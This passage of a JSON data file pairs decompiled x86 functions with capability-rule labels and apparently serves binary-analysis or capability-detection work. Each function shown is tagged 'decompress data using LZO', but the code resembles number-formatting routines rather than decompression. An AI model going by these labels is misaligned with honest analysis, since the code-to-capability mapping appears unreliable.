        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00475240(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uchar *puVar13;\n    uint32_t uVar14;\n    uint uVar15;\n    uchar *puVar16;\n    uchar *puVar17;\n    ulong uVar18;\n    uint uStackY116;\n    int32_t iStackY112;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_38h = arg_8h;\n    var_2ch = arg_1ch;\n    var_40h = arg_ch;\n    var_44h = arg_14h;\n    var_30h = arg_18h;\n    iStackY112 = 0x47527a;\n    iVar5 = fcn.0044da00(arg_10h + 0x6c);\n    var_34h = iVar5 + 0x26;\n    var_48h = *(arg_10h + 0xc);\n    uStackY116 = 0x475298;\n    var_3ch = var_48h;\n    iVar6 = fcn.00437ed0();\n    iVar6 = -iVar6;\n    puVar12 = &stack0xffffff90 + iVar6;\n    puVar13 = &stack0xffffff90 + iVar6;\n    var_48h = var_48h & 0x4a;\n    uVar14 = &fcn.00475240::var_48h + iVar6 + 3 & 0xfffffff0;\n    bVar9 = var_48h != 0x40 && var_48h != 8;\n    uVar4 = bVar9;\n    var_34h = var_34h & 0xffffff00 | uVar4;\n    uVar7 = var_30h;\n    uVar10 = var_2ch;\n    if ((((var_2ch - 1) + (var_30h != 0) | var_2ch) < 0) && (bVar9)) {\n        uVar7 = -var_30h;\n        uVar10 = -(var_2ch + (var_30h != 0));\n    }\n    *(&stack0xffffff94 + iVar6) = uVar7;\n    *(&stack0xffffff98 + iVar6) = uVar10;\n    *(&stack0xffffffa4 + iVar6) = uVar4;\n    uVar4 = var_3ch;\n    *(&stack0xffffff90 + iVar6) = uVar14 + 0x28;\n    *(&stack0xffffffa0 + iVar6) = uVar4;\n    *(&stack0xffffff9c + iVar6) = iVar5 + 0x26;\n    *(&stack0xffffff8c + iVar6) = 0x475303;\n    iVar8 = fcn.004bcd60();\n    puVar16 = (uVar14 - iVar8) + 0x28;\n    if (*(iVar5 + 0x10) == '\\0') {\n        if (var_34h != '\\0') goto code_r0x0047531e;\ncode_r0x00475444:\n        puVar17 = puVar16;\n        if (((var_3ch & 0x200) != 0) && ((var_30h | var_2ch) != 0)) {\n            if (var_48h == 0x40) {\n                iVar8 = iVar8 + 1;\n                puVar17 = puVar16 + -1;\n                *puVar17 = *(iVar5 + 0x2a);\n            }\n            else {\n                iVar8 = iVar8 + 2;\n                puVar17 = puVar16 + -2;\n                puVar16[-1] = *(iVar5 + 0x28 + (var_3ch >> 0xe & 1));\n                *puVar17 = *(iVar5 + 0x2a);\n            }\n        }\ncode_r0x00475332:\n        iVar6 = *(arg_10h + 8);\n        puVar12 = puVar13;\n        if (iVar6 <= iVar8) goto code_r0x0047533c;\n    }\n    else {\n        *(&stack0xffffff8c + iVar6) = 0x475400;\n        uVar18 = fcn.00437ed0();\n        iVar11 = uVar18 >> 0x20;\n        iVar3 = -uVar18;\n        puVar12 = &stack0xffffff90 + iVar3 + iVar6;\n        puVar13 = &stack0xffffff90 + iVar3 + iVar6;\n        *(&stack0xffffffa4 + iVar3 + iVar6) = iVar8 + iVar11;\n        *(&stack0xffffffa0 + iVar3 + iVar6) = iVar11;\n        puVar16 = (&fcn.00475240::var_48h + iVar3 + iVar6 + 3 & 0xfffffff0U) + 2;\n        *(&stack0xffffff9c + iVar3 + iVar6) = *(iVar5 + 0xc);\n        *(&stack0xffffff98 + iVar3 + iVar6) = *(iVar5 + 8);\n        cVar1 = *(iVar5 + 0x25);\n        *(&stack0xffffff90 + iVar3 + iVar6) = puVar16;\n        *(&stack0xffffff94 + iVar3 + iVar6) = cVar1;\n        *(&stack0xffffff8c + iVar3 + iVar6) = 0x475434;\n        iVar8 = fcn.004bd030();\n        iVar8 = iVar8 - puVar16;\n        if (var_34h == '\\0') goto code_r0x00475444;\ncode_r0x0047531e:\n        puVar13 = puVar12;\n        if (var_2ch < 0) {\n            iVar8 = iVar8 + 1;\n            puVar16[-1] = *(iVar5 + 0x26);\n            puVar17 = puVar16 + -1;\n            goto code_r0x00475332;\n        }\n        puVar17 = puVar16;\n        if ((var_3ch & 0x800) == 0) goto code_r0x00475332;\n        iVar8 = iVar8 + 1;\n        puVar17 = puVar16 + -1;\n        *puVar17 = *(iVar5 + 0x27);\n        iVar6 = *(arg_10h + 8);\n        if (iVar6 <= iVar8) goto code_r0x0047533c;\n    }\n    *(puVar12 + -4) = 0x4753a5;\n    uVar18 = fcn.00437ed0();\n    iVar5 = -uVar18;\n    *(puVar12 + iVar5 + 0x14) = iVar8;\n    *(puVar12 + iVar5 + 4) = var_44h;\n    puVar17 = puVar12 + iVar5 + 0x27 & 0xfffffff0;\n    *(puVar12 + iVar5 + 0xc) = uVar18 >> 0x20;\n    *(puVar12 + iVar5 + 0x10) = iVar6;\n    *(puVar12 + iVar5 + 8) = puVar17;\n    *(puVar12 + iVar5) = arg_10h;\n    *(puVar12 + iVar5 + -4) = 0x4753d3;\n    fcn.004aba90();\n    iVar8 = iVar6;\n    puVar12 = puVar12 + iVar5;\ncode_r0x0047533c:\n    uVar15 = var_40h;\n    *(arg_10h + 8) = 0;\n    if (var_40h == '\\0') {\n        iVar6 = *var_38h;\n        puVar12[1] = iVar8;\n        *puVar12 = puVar17;\n        pcVar2 = *(iVar6 + 0x30);\n        puVar12[-1] = 0x47535e;\n        iVar6 = (*pcVar2)();\n        if (iVar6 != iVar8) {\n            uVar15 = 1;\n        }\n    }\n    return CONCAT44(uVar15, var_38h) & 0xffffffffff;\n}\n",
        "token_count": 2025
    },
    "004754a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.004754a0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    uint *puVar14;\n    uint uVar15;\n    uchar *puVar16;\n    ulong uVar17;\n    uint uStackY116;\n    int32_t iStackY112;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uchar *var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t *var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    var_2ch = arg_8h;\n    var_44h = arg_18h;\n    var_38h = arg_ch;\n    var_40h = arg_14h;\n    var_30h = arg_1ch;\n    iStackY112 = 0x4754d8;\n    iVar5 = fcn.0044da00(arg_10h + 0x6c);\n    var_34h = iVar5 + 0x26;\n    uVar2 = *(arg_10h + 0xc);\n    uStackY116 = 0x4754f3;\n    iVar6 = fcn.00437ed0();\n    iVar6 = -iVar6;\n    puVar13 = &stack0xffffff90 + iVar6;\n    puVar12 = &stack0xffffff90 + iVar6;\n    uVar7 = uVar2 & 0x4a;\n    *(&stack0xffffff94 + iVar6) = arg_18h;\n    puVar10 = &fcn.004754a0::var_48h + iVar6 + 3 & 0xfffffff0;\n    var_48h = uVar7;\n    *(&stack0xffffffa0 + iVar6) = uVar2;\n    var_3ch = puVar10;\n    bVar9 = uVar7 != 0x40 && uVar7 != 8;\n    var_34h = var_34h & 0xffffff00 | bVar9;\n    *(&stack0xffffffa4 + iVar6) = bVar9;\n    uVar7 = var_30h;\n    *(&stack0xffffff9c + iVar6) = iVar5 + 0x26;\n    *(&stack0xffffff98 + iVar6) = uVar7;\n    *(&stack0xffffff90 + iVar6) = puVar10 + 0x28;\n    *(&stack0xffffff8c + iVar6) = 0x475540;\n    iVar8 = fcn.004bcd60();\n    puVar10 = var_3ch + (0x28 - iVar8);\n    if (*(iVar5 + 0x10) == '\\0') {\n    }\n    else {\n        *(&stack0xffffff8c + iVar6) = 0x4755bf;\n        uVar17 = fcn.00437ed0();\n        iVar11 = uVar17 >> 0x20;\n        iVar4 = -uVar17;\n        puVar13 = &stack0xffffff90 + iVar4 + iVar6;\n        puVar12 = &stack0xffffff90 + iVar4 + iVar6;\n        *(&stack0xffffffa4 + iVar4 + iVar6) = iVar8 + iVar11;\n        *(&stack0xffffffa0 + iVar4 + iVar6) = iVar11;\n        puVar10 = (&fcn.004754a0::var_48h + iVar4 + iVar6 + 3 & 0xfffffff0U) + 2;\n        *(&stack0xffffff9c + iVar4 + iVar6) = *(iVar5 + 0xc);\n        var_3ch = puVar10;\n        *(&stack0xffffff98 + iVar4 + iVar6) = *(iVar5 + 8);\n        cVar1 = *(iVar5 + 0x25);\n        *(&stack0xffffff90 + iVar4 + iVar6) = puVar10;\n        *(&stack0xffffff94 + iVar4 + iVar6) = cVar1;\n        *(&stack0xffffff8c + iVar4 + iVar6) = 0x4755f6;\n        iVar8 = fcn.004bd030();\n        iVar8 = iVar8 - var_3ch;\n        puVar10 = var_3ch;\n    }\n    puVar16 = puVar10;\n    if (((var_34h == '\\0') && (puVar13 = puVar12,  (uVar2 & 0x200) != 0)) && ((var_44h | var_30h) != 0)) {\n        if (var_48h == 0x40) {\n            iVar8 = iVar8 + 1;\n            puVar16 = puVar10 + -1;\n            *puVar16 = *(iVar5 + 0x2a);\n        }\n        else {\n            iVar8 = iVar8 + 2;\n            puVar16 = puVar10 + -2;\n            puVar10[-1] = *(iVar5 + 0x28 + (uVar2 >> 0xe & 1));\n            *puVar16 = *(iVar5 + 0x2a);\n        }\n    }\n    iVar6 = *(arg_10h + 8);\n    puVar14 = puVar13;\n    if (iVar8 < iVar6) {\n        *(puVar13 + -4) = 0x47565e;\n        uVar17 = fcn.00437ed0();\n        iVar5 = -uVar17;\n        puVar14 = puVar13 + iVar5;\n        *(puVar13 + iVar5 + 0x14) = iVar8;\n        *(puVar13 + iVar5 + 4) = var_40h;\n        puVar16 = puVar13 + iVar5 + 0x27 & 0xfffffff0;\n        *(puVar13 + iVar5 + 0xc) = uVar17 >> 0x20;\n        *(puVar13 + iVar5 + 0x10) = iVar6;\n        *(puVar13 + iVar5 + 8) = puVar16;\n        *(puVar13 + iVar5) = arg_10h;\n        *(puVar13 + iVar5 + -4) = 0x47568c;\n        fcn.004aba90();\n        iVar8 = iVar6;\n    }\n    uVar15 = var_38h;\n    *(arg_10h + 8) = 0;\n    if (var_38h == '\\0') {\n        iVar6 = *var_2ch;\n        puVar14[1] = iVar8;\n        *puVar14 = puVar16;\n        pcVar3 = *(iVar6 + 0x30);\n        puVar14[-1] = 0x47558a;\n        iVar6 = (*pcVar3)();\n        if (iVar6 != iVar8) {\n            uVar15 = 1;\n        }\n    }\n    return CONCAT44(uVar15, var_2ch) & 0xffffffffff;\n}\n",
        "token_count": 1707
    },
    "00475770": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00475770(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t *piVar9;\n    char **ppcVar10;\n    uchar *puVar11;\n    char **ppcVar12;\n    char *pcVar13;\n    char *pcVar14;\n    bool bVar15;\n    ulong uVar16;\n    ulong in_stack_00000018;\n    uint uStackY148;\n    int32_t iStackY144;\n    int32_t *piStack136;\n    int32_t iStack132;\n    uchar auStack128 [27];\n    uchar auStack101 [5];\n    int32_t *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint uStack72;\n    int32_t *var_40h;\n    char *s;\n    char *var_31h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_40h = arg_8h;\n    _var_48h = in_stack_00000018;\n    var_50h = arg_ch;\n    var_58h = arg_14h;\n    iStackY144 = 0x4757a8;\n    var_4ch = fcn.0044da00(arg_10h + 0x6c);\n    iVar7 = *(arg_10h + 4);\n    if (iVar7 < 0) {\n        iVar7 = 6;\n    }\n    piStack136 = arg_18h;\n    iStackY144 = arg_10h;\n    uStackY148 = 0x4757d9;\n    fcn.0048d660();\n    uStackY148 = 0x4757f1;\n    uVar16 = fcn.00437ed0();\n    iVar2 = -uVar16;\n    piVar9 = &stack0xffffff70 + iVar2;\n    s = &stack0xffffff9b + iVar2 & 0xfffffff0;\n    if (uVar16 >> 0x20 == 0x104) {\n        *(&stack0xffffff6c + iVar2) = 0x475a9a;\n        var_2ch = fcn.004ae940();\n        uVar16 = _var_48h;\n        *(&stack0xffffff7c + iVar2) = &fcn.00475770::var_28h;\n        pcVar3 = s;\n        *(&stack0xffffff78 + iVar2) = 0x2d;\n        *(&stack0xffffff74 + iVar2) = pcVar3;\n        *(&stack0xffffff70 + iVar2) = &fcn.00475770::var_2ch;\n        *(&stack0xffffff80 + iVar2) = uVar16;\n        *(&stack0xffffff6c + iVar2) = 0x475ac2;\n        *NULL = fcn.004bd670();\n        if (0x2c < *NULL) {\n            var_5ch = *NULL + 1;\n            *(&stack0xffffff6c + iVar2) = 0x475ae2;\n            iVar7 = fcn.00437ed0();\n            iVar7 = -iVar7;\n            piVar9 = &stack0xffffff70 + iVar7 + iVar2;\n            s = &stack0xffffff9b + iVar7 + iVar2 & 0xfffffff0;\n            *(&stack0xffffff6c + iVar7 + iVar2) = 0x475af3;\n            var_2ch = fcn.004ae940();\n            uVar16 = _var_48h;\n            piVar6 = var_5ch;\n            *(&stack0xffffff7c + iVar7 + iVar2) = &fcn.00475770::var_28h;\n            pcVar3 = s;\n            *(&stack0xffffff78 + iVar7 + iVar2) = piVar6;\n            *(&stack0xffffff74 + iVar7 + iVar2) = pcVar3;\n            *(&stack0xffffff70 + iVar7 + iVar2) = &fcn.00475770::var_2ch;\n            *(&stack0xffffff80 + iVar7 + iVar2) = uVar16;\n            *(&stack0xffffff6c + iVar7 + iVar2) = 0x475b17;\n            *NULL = fcn.004bd670();\n        }\n    }\n    else {\n        *(&stack0xffffff6c + iVar2) = 0x47580e;\n        var_2ch = fcn.004ae940();\n        uVar16 = _var_48h;\n        *(&stack0xffffff80 + iVar2) = iVar7;\n        pcVar3 = s;\n        *(&stack0xffffff7c + iVar2) = &fcn.00475770::var_28h;\n        *(&stack0xffffff74 + iVar2) = pcVar3;\n        *(&stack0xffffff78 + iVar2) = 0x2d;\n        *(&stack0xffffff70 + iVar2) = &fcn.00475770::var_2ch;\n        *(&stack0xffffff84 + iVar2) = uVar16;\n        *(&stack0xffffff6c + iVar2) = 0x47583a;\n        *NULL = fcn.004bd670();\n        piVar9 = &stack0xffffff70 + iVar2;\n        if (0x2c < *NULL) {\n            var_5ch = *NULL + 1;\n            *(&stack0xffffff6c + iVar2) = 0x475954;\n            iVar4 = fcn.00437ed0();\n            iVar4 = -iVar4;\n            piVar9 = &stack0xffffff70 + iVar4 + iVar2;\n            s = &stack0xffffff9b + iVar4 + iVar2 & 0xfffffff0;\n            *(&stack0xffffff6c + iVar4 + iVar2) = 0x475965;\n            var_2ch = fcn.004ae940();\n            uVar16 = _var_48h;\n            piVar6 = var_5ch;\n            *(&stack0xffffff80 + iVar4 + iVar2) = iVar7;\n            pcVar3 = s;\n            *(&stack0xffffff7c + iVar4 + iVar2) = &fcn.00475770::var_28h;\n            *(&stack0xffffff74 + iVar4 + iVar2) = pcVar3;\n            *(&stack0xffffff78 + iVar4 + iVar2) = piVar6;\n            *(&stack0xffffff70 + iVar4 + iVar2) = &fcn.00475770::var_2ch;\n            *(&stack0xffffff84 + iVar4 + iVar2) = uVar16;\n            *(&stack0xffffff6c + iVar4 + iVar2) = 0x475990;\n            *NULL = fcn.004bd670();\n        }\n    }\n    *piVar9 = arg_10h + 0x6c;\n    piVar9[-1] = 0x47584e;\n    fcn.004c0160();\n    pcVar13 = stack0xffffffcc;\n    piVar9[-1] = 0x475863;\n    uVar16 = fcn.00437ed0();\n    pcVar3 = s;\n    piVar6 = uVar16 >> 0x20;\n    iVar7 = -uVar16;\n    ppcVar12 = piVar9 + iVar7;\n    pcVar14 = piVar9 + iVar7 + 0x2b & 0xfffffff0;\n    _var_48h = CONCAT44(uStack72, piVar9 + iVar7 + 0x2b) & 0xfffffffffffffff0;\n    if (*(piVar6 + 7) == '\\x01') {\n        *(piVar9 + iVar7 + 8) = pcVar13;\n        *(piVar9 + iVar7) = pcVar14;\n        *(piVar9 + iVar7 + 4) = pcVar3;\n        *(piVar9 + iVar7 + -4) = 0x475bd3;\n        sub.msvcrt.dll_memcpy();\n    }\n    else {\n        if (*(piVar6 + 7) == '\\0') {\n            var_5ch = piVar6;\n            *(piVar9 + iVar7 + -4) = 0x475b2a;\n            fcn.004512b0();\n            pcVar1 = *(*var_5ch + 0x1c);\n            pcVar3 = s;\n        }\n        else {\n            pcVar1 = *(*piVar6 + 0x1c);\n        }\n        s = pcVar3;\n        if (pcVar1 == 0x451530) {\n            *(piVar9 + iVar7 + 8) = pcVar13;\n            *(piVar9 + iVar7) = pcVar14;\n            *(piVar9 + iVar7 + 4) = pcVar3;\n            *(piVar9 + iVar7 + -4) = 0x4758a6;\n            sub.msvcrt.dll_memcpy();\n            ppcVar12 = piVar9 + iVar7;\n            pcVar13 = stack0xffffffcc;\n        }\n        else {\n            *(piVar9 + iVar7 + 8) = pcVar14;\n            *(piVar9 + iVar7) = pcVar3;\n            *(piVar9 + iVar7 + 4) = pcVar13 + pcVar3;\n            puVar11 = piVar9 + iVar7 + -4;\n            *(piVar9 + iVar7 + -4) = 0x475b51;\n            (*pcVar1)();\n            ppcVar12 = puVar11 + -0xc;\n            pcVar13 = stack0xffffffcc;\n        }\n    }\n    pcVar3 = s;\n    if (pcVar13 == NULL) {\n        if (*(var_4ch + 0x10) != '\\0') goto code_r0x004759af;\ncode_r0x004758eb:\n        pcVar3 = *(arg_10h + 8);\n        ppcVar10 = ppcVar12;\n        if (pcVar3 <= pcVar13) goto code_r0x004758f9;\n    }\n    else {\n        ppcVar12[2] = pcVar13;\n        ppcVar12[1] = 0x2e;\n        *ppcVar12 = pcVar3;\n        ppcVar12[-1] = 0x4758ca;\n        iVar7 = sub.msvcrt.dll_memchr();\n        if (iVar7 == 0) {\n            if ((*(var_4ch + 0x10) != '\\0') &&\n               ((pcVar13 < 3 ||\n                (((s[1] < ':' && (var_5ch = var_5ch & 0xffffff00 | s[2],  s[2] - 0x30U < 10)) && ('/' < s[1]))))))\n            goto code_r0x004759af;\n            goto code_r0x004758eb;\n        }\n        pcVar14[iVar7 - s] = *(var_4ch + 0x24);\n        if (*(var_4ch + 0x10) == '\\0') goto code_r0x004758eb;\ncode_r0x004759af:\n        ppcVar12[-1] = 0x4759be;\n        uVar16 = fcn.00437ed0();\n        iVar7 = -uVar16;\n        pcVar5 = ppcVar12 + iVar7 + 0x2b & 0xfffffff0;\n        bVar15 = (*s - 0x2bU & 0xfd) == 0;\n        pcVar3 = pcVar5;\n        if (bVar15) {\n            _var_48h = _var_48h & 0xffffffff00000000 | ZEXT48(pcVar14 + 1);\n            *pcVar5 = *pcVar14;\n            stack0xffffffcc = pcVar13 + -1;\n            pcVar3 = pcVar5 + 1;\n        }\n        s = pcVar5;\n        *(ppcVar12 + iVar7 + 0x18) = &fcn.00475770::var_31h + 1;\n        *(ppcVar12 + iVar7 + 0x14) = var_48h;\n        iVar2 = var_4ch;\n        *(ppcVar12 + iVar7 + 0x10) = pcVar3;\n        *(ppcVar12 + iVar7 + 0xc) = uVar16 >> 0x20;\n        *(ppcVar12 + iVar7 + 8) = *(iVar2 + 0x25);\n        *(ppcVar12 + iVar7 + 4) = *(iVar2 + 0xc);\n        *(ppcVar12 + iVar7) = *(iVar2 + 8);\n        *(ppcVar12 + iVar7 + -4) = 0x475a2e;\n        fcn.004756b0();\n        pcVar13 = stack0xffffffcc + bVar15;\n        ppcVar10 = ppcVar12 + iVar7 + -0x1c;\n        ppcVar12 = ppcVar12 + iVar7 + -0x1c;\n        stack0xffffffcc = pcVar13;\n        _var_48h = _var_48h & 0xffffffff00000000 | ZEXT48(s);\n        pcVar3 = *(arg_10h + 8);\n        if (pcVar3 <= pcVar13) goto code_r0x004758f9;\n    }\n    *(ppcVar10 + -4) = 0x475a59;\n    iVar7 = fcn.00437ed0();\n    iVar7 = -iVar7;\n    ppcVar12 = ppcVar10 + iVar7;\n    *(ppcVar10 + iVar7 + 0x14) = pcVar13;\n    *(ppcVar10 + iVar7 + 0xc) = var_48h;\n    *(ppcVar10 + iVar7 + 0x10) = pcVar3;\n    *(ppcVar10 + iVar7 + 4) = var_58h;\n    *(ppcVar10 + iVar7 + 8) = ppcVar10 + iVar7 + 0x2b & 0xfffffff0;\n    *(ppcVar10 + iVar7) = arg_10h;\n    *(ppcVar10 + iVar7 + -4) = 0x475a8a;\n    fcn.004aba90();\n    stack0xffffffcc = pcVar3;\n    _var_48h = _var_48h & 0xffffffff00000000 | ZEXT48(ppcVar10 + iVar7 + 0x2b) & 0xfffffffffffffff0;\n    pcVar13 = pcVar3;\ncode_r0x004758f9:\n    uVar8 = var_50h;\n    *(arg_10h + 8) = 0;\n    if (var_50h == '\\0') {\n        iVar7 = *var_40h;\n        ppcVar12[1] = pcVar13;\n        *ppcVar12 = var_48h;\n        pcVar1 = *(iVar7 + 0x30);\n        ppcVar12[-1] = 0x47591e;\n        pcVar3 = (*pcVar1)();\n        if (pcVar3 != pcVar13) {\n            uVar8 = 1;\n        }\n    }\n    return CONCAT44(uVar8, var_40h) & 0xffffffffff;\n}\n",
        "token_count": 3545
    },
    "00475be0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00475be0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t *piVar9;\n    char **ppcVar10;\n    uchar *puVar11;\n    char **ppcVar12;\n    char *pcVar13;\n    char *pcVar14;\n    bool bVar15;\n    ulong uVar16;\n    unkbyte10 in_stack_00000018;\n    uint uStackY132;\n    int32_t iStackY128;\n    char *pcStack120;\n    int32_t iStack116;\n    uchar auStack112 [20];\n    int32_t *var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t *var_44h;\n    char *var_40h;\n    char *s;\n    char *var_31h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_44h = arg_8h;\n    var_4ch = arg_ch;\n    var_54h = arg_14h;\n    iStackY128 = 0x475c12;\n    var_48h = fcn.0044da00(arg_10h + 0x6c);\n    iVar7 = *(arg_10h + 4);\n    if (iVar7 < 0) {\n        iVar7 = 6;\n    }\n    pcStack120 = arg_18h;\n    iStackY128 = arg_10h;\n    uStackY132 = 0x475c43;\n    fcn.0048d660();\n    uStackY132 = 0x475c5b;\n    uVar16 = fcn.00437ed0();\n    iVar2 = -uVar16;\n    piVar9 = &stack0xffffff80 + iVar2;\n    s = &fcn.00475be0::var_50h + iVar2 + 3 & 0xfffffff0;\n    if (uVar16 >> 0x20 == 0x104) {\n        *(&stack0xffffff7c + iVar2) = 0x475f0a;\n        var_2ch = fcn.004ae940();\n        *(&stack0xffffff8c + iVar2) = &fcn.00475be0::var_28h;\n        pcVar3 = s;\n        *(&stack0xffffff88 + iVar2) = 0x36;\n        *(&stack0xffffff90 + iVar2) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar2) = pcVar3;\n        *(&stack0xffffff80 + iVar2) = &fcn.00475be0::var_2ch;\n        *(&stack0xffffff7c + iVar2) = 0x475f32;\n        *NULL = fcn.004bd670();\n        if (0x35 < *NULL) {\n            var_40h = *NULL + 1;\n            *(&stack0xffffff7c + iVar2) = 0x475f52;\n            iVar7 = fcn.00437ed0();\n            iVar7 = -iVar7;\n            piVar9 = &stack0xffffff80 + iVar7 + iVar2;\n            s = &fcn.00475be0::var_50h + iVar7 + iVar2 + 3 & 0xfffffff0;\n            *(&stack0xffffff7c + iVar7 + iVar2) = 0x475f63;\n            var_2ch = fcn.004ae940();\n            pcVar3 = var_40h;\n            *(&stack0xffffff8c + iVar7 + iVar2) = &fcn.00475be0::var_28h;\n            pcVar13 = s;\n            *(&stack0xffffff88 + iVar7 + iVar2) = pcVar3;\n            *(&stack0xffffff90 + iVar7 + iVar2) = in_stack_00000018;\n            *(&stack0xffffff84 + iVar7 + iVar2) = pcVar13;\n            *(&stack0xffffff80 + iVar7 + iVar2) = &fcn.00475be0::var_2ch;\n            *(&stack0xffffff7c + iVar7 + iVar2) = 0x475f87;\n            *NULL = fcn.004bd670();\n        }\n    }\n    else {\n        *(&stack0xffffff7c + iVar2) = 0x475c78;\n        var_2ch = fcn.004ae940();\n        *(&stack0xffffff90 + iVar2) = iVar7;\n        pcVar3 = s;\n        *(&stack0xffffff8c + iVar2) = &fcn.00475be0::var_28h;\n        *(&stack0xffffff94 + iVar2) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar2) = pcVar3;\n        *(&stack0xffffff88 + iVar2) = 0x36;\n        *(&stack0xffffff80 + iVar2) = &fcn.00475be0::var_2ch;\n        *(&stack0xffffff7c + iVar2) = 0x475ca4;\n        *NULL = fcn.004bd670();\n        piVar9 = &stack0xffffff80 + iVar2;\n        if (0x35 < *NULL) {\n            var_40h = *NULL + 1;\n            *(&stack0xffffff7c + iVar2) = 0x475dc4;\n            iVar4 = fcn.00437ed0();\n            iVar4 = -iVar4;\n            piVar9 = &stack0xffffff80 + iVar4 + iVar2;\n            s = &fcn.00475be0::var_50h + iVar4 + iVar2 + 3 & 0xfffffff0;\n            *(&stack0xffffff7c + iVar4 + iVar2) = 0x475dd5;\n            var_2ch = fcn.004ae940();\n            pcVar3 = var_40h;\n            *(&stack0xffffff90 + iVar4 + iVar2) = iVar7;\n            pcVar13 = s;\n            *(&stack0xffffff8c + iVar4 + iVar2) = &fcn.00475be0::var_28h;\n            *(&stack0xffffff94 + iVar4 + iVar2) = in_stack_00000018;\n            *(&stack0xffffff84 + iVar4 + iVar2) = pcVar13;\n            *(&stack0xffffff88 + iVar4 + iVar2) = pcVar3;\n            *(&stack0xffffff80 + iVar4 + iVar2) = &fcn.00475be0::var_2ch;\n            *(&stack0xffffff7c + iVar4 + iVar2) = 0x475e00;\n            *NULL = fcn.004bd670();\n        }\n    }\n    *piVar9 = arg_10h + 0x6c;\n    piVar9[-1] = 0x475cb8;\n    fcn.004c0160();\n    pcVar13 = stack0xffffffcc;\n    piVar9[-1] = 0x475ccd;\n    uVar16 = fcn.00437ed0();\n    pcVar3 = s;\n    piVar6 = uVar16 >> 0x20;\n    iVar7 = -uVar16;\n    ppcVar12 = piVar9 + iVar7;\n    pcVar14 = piVar9 + iVar7 + 0x2f & 0xfffffff0;\n    var_40h = pcVar14;\n    if (*(piVar6 + 7) == '\\x01') {\n        *(piVar9 + iVar7 + 8) = pcVar13;\n        *(piVar9 + iVar7) = pcVar14;\n        *(piVar9 + iVar7 + 4) = pcVar3;\n        *(piVar9 + iVar7 + -4) = 0x476043;\n        sub.msvcrt.dll_memcpy();\n    }\n    else {\n        if (*(piVar6 + 7) == '\\0') {\n            var_58h = piVar6;\n            *(piVar9 + iVar7 + -4) = 0x475f9a;\n            fcn.004512b0();\n            pcVar1 = *(*var_58h + 0x1c);\n            pcVar3 = s;\n        }\n        else {\n            pcVar1 = *(*piVar6 + 0x1c);\n        }\n        s = pcVar3;\n        if (pcVar1 == 0x451530) {\n            *(piVar9 + iVar7 + 8) = pcVar13;\n            *(piVar9 + iVar7) = pcVar14;\n            *(piVar9 + iVar7 + 4) = pcVar3;\n            *(piVar9 + iVar7 + -4) = 0x475d10;\n            sub.msvcrt.dll_memcpy();\n            ppcVar12 = piVar9 + iVar7;\n            pcVar13 = stack0xffffffcc;\n        }\n        else {\n            *(piVar9 + iVar7 + 8) = pcVar14;\n            *(piVar9 + iVar7) = pcVar3;\n            *(piVar9 + iVar7 + 4) = pcVar13 + pcVar3;\n            puVar11 = piVar9 + iVar7 + -4;\n            *(piVar9 + iVar7 + -4) = 0x475fc1;\n            (*pcVar1)();\n            ppcVar12 = puVar11 + -0xc;\n            pcVar13 = stack0xffffffcc;\n        }\n    }\n    pcVar3 = s;\n    if (pcVar13 == NULL) {\n        if (*(var_48h + 